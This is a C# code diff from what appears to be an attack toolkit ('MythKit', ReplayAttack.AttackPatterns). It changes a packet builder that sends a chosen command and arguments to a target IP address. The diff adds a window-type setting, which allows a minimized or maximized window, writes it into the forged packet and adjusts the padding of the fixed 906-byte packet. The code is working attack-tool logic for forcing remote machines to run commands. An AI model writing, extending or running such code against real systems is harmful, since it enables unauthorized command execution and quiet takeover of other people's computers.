@@ -30,12 +30,17 @@ namespace MythKit.Pages.ReplayAttack.AttackPatterns
                 Command.Text = commandText;
             if (serializedData.TryGetValue("arguments", out object arguments) && arguments is string argumentText)
                 Arguments.Text = argumentText;
+            WindowType.SelectedValue = "normal";
+            if (serializedData.TryGetValue("windowType", out object windowType) && windowType is string windowTypeValue &&
+                (windowTypeValue == "normal" || windowTypeValue == "minimized" || windowTypeValue == "maximized"))
+                WindowType.SelectedValue = windowTypeValue;
         }
 
         public Dictionary<string, object> Serialize() => new Dictionary<string, object>
         {
             ["command"] = Command.Text,
-            ["arguments"] = Arguments.Text
+            ["arguments"] = Arguments.Text,
+            ["windowType"] = WindowType.SelectedValue?.ToString() ?? "normal"
         };
 
         public AttackPacket ConstructPacket(ref string message, IPAddress ip, int cycleCount, int groupCount)
@@ -86,17 +91,21 @@ namespace MythKit.Pages.ReplayAttack.AttackPatterns
                 byte[] argumentBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Arguments.Text, ip, cycleCount, groupCount));
                 memoryStream.Write(argumentBytes, 0, argumentBytes.Length);
 
-                // Padding to 906 bytes
+                // Padding to 892 bytes
                 currentLength = (int)memoryStream.Length;
-                if (currentLength < 906)
+                if (currentLength < 892)
                 {
-                    byte[] finalPaddingBytes = new byte[906 - currentLength];
+                    byte[] finalPaddingBytes = new byte[892 - currentLength];
                     memoryStream.Write(finalPaddingBytes, 0, finalPaddingBytes.Length);
                 }
-                else if (currentLength > 906)
+                else if (currentLength > 892)
                 {
-                    message = string.Format("Packet length exceeds 906 bytes (current: {0})", currentLength);
+                    message = string.Format("Packet length exceeds 892 bytes (current: {0})", currentLength);
                 }
+                memoryStream.WriteByte((byte)Math.Max(WindowType.SelectedIndex, 0));
+                // Padding to 906 bytes
+                currentLength = (int)memoryStream.Length;
+                memoryStream.Write(new byte[906 - currentLength], 0, 906 - currentLength);
 
                 packet = memoryStream.ToArray();
             }
